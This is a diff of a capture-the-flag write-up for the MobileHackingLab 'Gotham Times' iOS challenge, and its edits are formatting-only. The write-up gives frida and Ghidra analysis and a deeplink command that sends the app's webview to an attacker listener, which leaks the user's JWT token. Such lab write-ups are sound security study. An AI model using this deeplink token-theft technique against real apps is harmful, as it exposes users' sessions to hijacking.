@@ -1,7 +1,4 @@
-Title: MobileHackingLab - Gotham Times
-Slug: mobile/mobilehackinglab/gotham-times
-Date: 2025-10-04 18:00
-Category: Mobile
+# MobileHackingLab - Gotham Times
 
 This is an iOS mobile challenge from [MobileHackingLabs](https://www.mobilehackinglab.com/course/lab-gotham-times).
 
@@ -11,17 +8,17 @@ The challenge is built around the fictional newspaper Gotham Times, an iOS appli
 
 The app presents itself as follows:
 
-![[gotham-times-app-1.jpg]]
+![gotham-times-app-1](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-app-1.jpg)
 
-![[gotham-times-app-2.jpg]]
+![gotham-times-app-2](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-app-2.jpg)
 
 When focusing on any text field, on a real iPhone device (no Corelium emulator), the keyboard remains opened and it's not possible to close it even by tapping outside the field:
 
-![[gotham-times-app-3.jpg]]
+![gotham-times-app-3](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-app-3.jpg)
 
 This didn't allowed me to complete the signup process. To bypass this inconvenience, I've programmatically forced closing the keyboard with the following `frida` script:
 
-~~~javascript
+```javascript
 function closeKeyboard(f=null){
     // Collect all Gotham Times' Controllers
     let controllers = Object.keys(ObjC.classes).filter(x => x.includes('Gotham') && x.includes('Controller'));   
@@ -43,32 +40,32 @@ function closeKeyboard(f=null){
         })
     })
 }
-~~~
+```
 
-![[gotham-times-frida-1.png]]
+![gotham-times-frida-1](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-frida-1.png)
 
 The script has been executed as follows:
 
-![[gotham-times-frida-2.png]]
+![gotham-times-frida-2](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-frida-2.png)
 
 The keyboard is closed and it's possible to complete the signup process:
 
-![[gotham-times-app-4.jpg]]
+![gotham-times-app-4](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-app-4.jpg)
 
 After creating an account and logging in, the app presents a list of news as shown below:
 
 
-![[gotham-times-app-5.jpg]]
+![gotham-times-app-5](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-app-5.jpg)
 
 ## Static Analysis
 
 Since the goal of the challenge is to exploit a deeplink, the first step has been to analyze which URL schema the applications allows by analysing the application's `Info.plist`:
 
-~~~shell
+```shell
 plutil -p Payload/Gotham\ Times.app/Info.plist
-~~~
+```
 
-![[gotham-times-static-1.png]]
+![gotham-times-static-1](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-static-1.png)
 
 The URL schema `gothamtimes` is therefore identified.
 
@@ -76,25 +73,25 @@ The URL schema `gothamtimes` is therefore identified.
 
 In order to understand which class handles the deeplink, I've setup `frida-trace` as follows, tracing all methods for all classing starting with "Gotham":
 
-~~~
+```
 frida-trace -U -m "*[Gotham* *]" -n 'Gotham Times' 
-~~~
+```
 
-![[gotham-times-dynamic-1.png]]
+![gotham-times-dynamic-1](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-dynamic-1.png)
 
 Then, after connecting with SSH to the device, I've ran the following command to trigger the deeplink:
 
-~~~
+```
 uiopen gothamtimes://test
-~~~
+```
 
 As shown below, the class `Gotham_Times::SceneDelegate` handles the deeplink with the method `scene`:
 
-![[gotham-times-dynamic-2.png]]
+![gotham-times-dynamic-2](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-dynamic-2.png)
 
 Following the decompiled code from `ghidra` of the `Gotham_Times::SceneDelegate::scene` method:
 
-~~~c
+```c
 /* Gotham_Times.SceneDelegate.scene(_: __C.UIScene, openURLContexts:
    Swift.Set<__C.UIOpenURLContext>) -> () */
 
@@ -566,7 +563,7 @@ LAB_1000195a4:
   }
   return;
 }
-~~~
+```
 
 This method perform the following operations:
 
@@ -581,20 +578,20 @@ Therefore, based on the decompiled code, the deeplink format that the applicatio
 
 The following deeplink is executed; the `url` parameter points to an attacker-controlled server on which has been preemptively setup a listener on port `8000`.
 
-~~~shell
+```shell
 uiopen 'gothamtimes://open?url=http://192.168.1.182:8000'
-~~~
+```
 
-![[gotham-times-solution-1.png]]
+![gotham-times-solution-1](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-solution-1.png)
 
-![[gotham-times-app-6.jpg]]
+![gotham-times-app-6](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-app-6.jpg)
 
 The application processes the deeplinks and opens a webview to the provided URL; on the attacker listener, the following headers are received, leaking the JWT token in the `Authorization` header  and the flag:
 
-![[gotham-times-solution-2.png]]
+![gotham-times-solution-2](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-solution-2.png)
 
 ## Extended Analysis
 
 By looking  to the `Info.plist`'s `UIApplicationSceneManifest` property, it's possible to statically identify the deeplink handler without need of `frida-trace`:
 
-![[gotham-times-static-2.png]]
+![gotham-times-static-2](../../images/mobile/mobilehackinglab/gotham-times/gotham-times-static-2.png)
